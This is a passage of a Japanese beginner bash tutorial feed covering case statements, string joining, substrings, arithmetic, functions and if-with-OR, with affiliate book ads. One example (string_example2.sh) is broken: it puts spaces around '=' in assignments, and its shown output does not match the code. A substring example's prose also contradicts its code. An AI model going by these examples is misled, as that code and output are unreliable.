&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>case文で入力された文字列の大文字と小文字に対応する。&lt;/dd>
&lt;dd>または文字列に対応する場合は以下のソースを見て欲しい。&lt;/dd>
&lt;dd>レベルアップしたソースコードはささいな気遣いから生まれる&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#! /bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> in
&lt;span class="o">[&lt;/span>Yy&lt;span class="o">]&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="s2">&amp;#34;yes&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="c1">#Y、yまたはyesという文字列&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;YES&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;OK&amp;#34;&lt;/span>
&lt;span class="p">;;&lt;/span>
&lt;span class="o">[&lt;/span>Nn&lt;span class="o">]&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="s2">&amp;#34;no&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="c1">#N、nまたはnoという文字列&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;NO&amp;#34;&lt;/span>
&lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;undefined&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="変数に2つの文字列を組み合わせる">変数に2つの文字列を組み合わせる&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>文字列変数を組み合わせる：&lt;/b>&lt;/font>&lt;br>
文字列変数はbashで簡単に組み合わせることができます。「string_combine.sh」という名前のファイルを作成し、次のスクリプトを追加して、変数を一緒に配置するか、「+」演算子を使用して、bashで文字列変数を組み合わせる方法を確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:string_combine.sh" data-lang="bash:string_combine.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">string1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Apple&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">string2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Mac OS&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$string1&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$string2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">string3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$string1&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$string2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">string3&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34; は、とても優れたＯＳです。&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$string3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash string_combine.sh
Apple Mac OS
Apple Mac OS は、とても優れたＯＳです。
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>Bash は += 演算子を用いて文字列を連結することもできます。単純に a+=b とすると、a=a+b と理解することができます。&lt;/dd>
&lt;dd>
&lt;p>変数と文字列の結合は変数を{} でくくります。以下のソースを見て下さい。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:string_example2.sh" data-lang="bash:string_example2.sh">&lt;span class="cp">#!/bin/sh
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">str1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;Shell script&amp;#34;&lt;/span>
&lt;span class="nv">str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">str1&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> is intersting!!&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$str&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash string_example2.sh
$ Shell script is interesting!!
$
&lt;/code>&lt;/pre>&lt;h2 id="文字列の部分文字列を取得する">文字列の部分文字列を取得する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>文字列の部分文字列を取得します。&lt;/b>&lt;/font>&lt;br>
他のプログラミング言語と同様に、bashには文字列データから値を切り取る組み込み関数はありません。ただし、次のスクリプトに示すbashで、別の方法で部分文字列のタスクを実行できます。スクリプトをテストするには、次のコードを使用して「substring_example.sh」という名前のファイルを作成します。ここで、値6は部分文字列が開始する開始点を示し、5は部分文字列の長さを示します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:substring_example.sh" data-lang="bash:substring_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">Str&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Learn Bash from NLP&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">subStr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">Str&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">6&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">4&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$subStr&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash substring_example.sh
Bash
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>基本パターンは以下の通り&lt;/dd>
&lt;dd>${パラメータ:オフセット:長さ}&lt;br>
:&lt;/dd>
&lt;dd>Bashでの文字列の切り出しはかなりの頻度で使います。&lt;/dd>
&lt;dd>知っているのと知らないのとでは、苦労が違ってきます。&lt;/dd>
&lt;dd>具体例を以下にしめします。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code class="language-bash:部分文字列抽出" data-lang="bash:部分文字列抽出">#!/bin/bash
HOGE=&amp;quot;abcdef&amp;quot;
# オフセット位置から長さ分を取得
echo ${HOGE:0:2}
# -&amp;gt; ab
echo ${HOGE:2:2}
# -&amp;gt; cd
echo ${HOGE:4:2}
# -&amp;gt; ef
# 長さを省略した場合はオフセットから最後まで出力
echo ${HOGE:2}
# -&amp;gt; cdef
# 長さにマイナスを指定した場合は最後からマイナス分引いた位置までの長さになる
echo ${HOGE:0:-2}
# -&amp;gt; abcd
# オフセットの位置にマイナスを指定した場合は文法として別のパラメータ展開になる(デフォルト値の指定)
# 指定した変数が空文字列の場合は右に指定した文字が入る
echo ${HOGE:-2}
# -&amp;gt; abcdef
HOGE=
echo ${HOGE:-2}
# -&amp;gt; 2
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash:右端からのパターン一致除外" data-lang="bash:右端からのパターン一致除外">#!/bin/bash
HOGE=hoge.tar.bz2
echo ${HOGE}
# -&amp;gt; hoge.tar.bz2
# 最短除外
echo ${HOGE%.*}
# -&amp;gt; hoge.tar
# 最長除外
echo ${HOGE%%.*}
# -&amp;gt; hoge
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash:左端からのパターン一致除外" data-lang="bash:左端からのパターン一致除外">#!/bin/bash
HOGE=/home/user/hoge
echo ${HOGE}
# -&amp;gt; /home/user/hoge
# 最短除外
echo ${HOGE#*/}
# -&amp;gt; home/user/hoge
# 最長除外
echo ${HOGE##*/}
# -&amp;gt; hoge
&lt;/code>&lt;/pre>&lt;h2 id="変数に2つの数値を追加します">変数に2つの数値を追加します&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>2つの数字を追加します。&lt;/b>&lt;/font>&lt;br>
さまざまな方法でbashの算術演算を実行できます。次のスクリプトに、二重角かっこを使用してbashに2つの整数を追加する方法を示します。次のコードを使用して、「add_numbers.sh」という名前のファイルを作成します。2つの整数値がユーザーから取得され、加算の結果が出力されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:add_numbers.sh" data-lang="bash:add_numbers.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;最初の数値を入力&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> x&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;2番目の数値を入力&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> y&lt;span class="p">;&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">sum&lt;/span>&lt;span class="o">=&lt;/span>x+y&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;加算の結果=&lt;/span>&lt;span class="nv">$sum&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash add_numbers.sh
最初の数値を入力
25
2番目の数値を入力
56
加算の結果=81
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>((sum=x+y));&lt;/dd>
&lt;dd>昔の書籍でシェルスクリプトを勉強している人は、驚くかもしれない。だが、今の時代、Bashでは上記のように書く。昔は&lt;/dd>
&lt;dd>
&lt;p>$ echo `expr 1 + 1`&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>こんな書き方をした。現在のBashでは算術演算子が使える。&lt;/p>
&lt;/dd>
&lt;dd>以下ににまとめてみた。2重括弧でくくればいい。2重括弧の中に変数を使うことも可能だ。さらに変数は見にくい「$」をつける必要すらない。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code class="language-bash:算術演算子" data-lang="bash:算術演算子">$ echo `expr 1+1` # 昔のやり方
$ echo $((5+5)) # 今のやり方
$ echo $((5-5))
$ echo $((5*5))
$ echo $((5/5))
$ echo $((5%5))
# なんと比較演算子もいける！
$ echo $((0==1)) # 等号、結果: 0
$ echo $((0!=1)) # 否定等号、結果: 1
$ echo $((0&amp;lt;1)) # 未満、結果: 1
$ echo $((0&amp;lt;=1)) # 以下、結果: 1
$ echo $((0&amp;gt;1)) # 大なり、結果: 0
$ echo $((0&amp;gt;=1)) # 以上、結果: 0
&lt;/code>&lt;/pre>&lt;h2 id="関数を作成する">関数を作成する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>関数の作成：&lt;/b>&lt;/font>&lt;br>
簡単な関数を作成して関数を呼び出す方法を次のスクリプトに示します。&amp;lsquo;function_example.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。bashスクリプトで角かっこを使用せずに、名前でのみ関数を呼び出すことができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">function&lt;/span> 関数の名前&lt;span class="o">(){&lt;/span>
処理
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このとき、functionは省略可能です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
関数の名前&lt;span class="o">(){&lt;/span>
処理
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>関数の呼び出しは、関数を定義した後に関数の名前を書くだけです。&lt;/p>
&lt;pre tabindex="0">&lt;code>関数の名前 引数
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 関数の定義&lt;/span>
&lt;span class="k">function&lt;/span> say_hello&lt;span class="o">(){&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello, world!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 関数の呼び出し&lt;/span>
say_hello&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>このとき、関数の名前に続けて、引数を書くことができます。関数内では、通常のシェルスクリプトの引数を処理するのと同じように$1、$2、&amp;hellip;という形でアクセスできます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="関数パラメーターを使用する">関数パラメーターを使用する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>パラメータを使用して関数を作成します。&lt;/b>&lt;/font>&lt;br>
Bashは、関数宣言時に関数パラメーターまたは引数を宣言できません。ただし、他の変数を使用して、関数内でパラメーターを使用できます。関数の呼び出し時に2つの値が渡された場合、値の読み取りには$1と$2の変数が使用されます。&amp;lsquo;function_parameter.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、関数 &amp;lsquo;Rectangle_Area&amp;rsquo;は、パラメーター値に基づいて長方形の面積を計算します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:function_parameter.sh" data-lang="bash:function_parameter.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
Rectangle_Area&lt;span class="o">(){&lt;/span>
&lt;span class="nv">area&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$((&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;面積は : &lt;/span>&lt;span class="nv">$area&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
Rectangle_Area &lt;span class="m">10&lt;/span> 20&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash-5.1$ bash tmp
面積は : 200
bash-5.1$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>戻り値について&lt;/dt>
&lt;dd>bashシェルスクリプトには「戻り値」というものは基本的に存在しない。&lt;/dd>
&lt;dd>
&lt;p>解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。&lt;/p>
&lt;/dd>
&lt;dd>「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;!--
## ２０．スクリプトからの戻り値を渡す
## ２１．ディレクトリを作成する
## ２２．存在を確認してディレクトリを作成する
## ２３．ファイルを読む
## ２４．ファイルを削除する
## ２５．ファイルに追加
## ２６．ファイルが存在するかどうかを確認
## ２７．mailコマンド
## ２８．dateコマンド
## ２９．waitコマンド
## ３０．sleepコマンド
-->
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１０．or 条件を if文で使う】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-10-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-10-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-10-suzuki/shellscript.jpg" alt="Featured image of post 【１０．or 条件を if文で使う】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="or-条件を-if文で使う">or 条件を if文で使う&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>orロジックでifステートメントを使用する：&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;||&amp;lsquo;は、ifステートメントでorロジックを定義するために使用されます。次のコードを使用して「if_with_or.sh」という名前のファイルを作成し、ifステートメントのorロジックの使用を確認します。ここで、nの値はユーザーから取得されます。値が15または45の場合、出力は「ゲームに勝ちました」になります。それ以外の場合、出力は「ゲームに負けました」になります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:if_with_or.sh" data-lang="bash:if_with_or.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;数値を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> n&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">15&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq 45&lt;span class="o">)&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ゲームに勝ちました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ゲームに負けました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash if_with_or.sh
数値を入力して下さい。
5
ゲームに負けました
$ bash if_with_or.sh
数値を入力して下さい。
45
ゲームに勝ちました
bash-5.1$
&lt;/code>&lt;/pre>&lt;table>
&lt;tr>&lt;td>比較演算子&lt;/td>&lt;td>使用例&lt;/td>&lt;td>意味&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-n&lt;/td>&lt;td>-n 文字列 &lt;/td>&lt;td>文字列の長さが0より大きければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-z&lt;/td>&lt;td>-z 文字列 &lt;/td>&lt;td>文字列の長さが0であれば真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>=&lt;/td>&lt;td>文字列A = 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>!=&lt;/td>&lt;td>文字列A != 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しくなければ真&lt;/td>&lt;/tr>
&lt;/table>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。&lt;/dd>
&lt;dd>また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
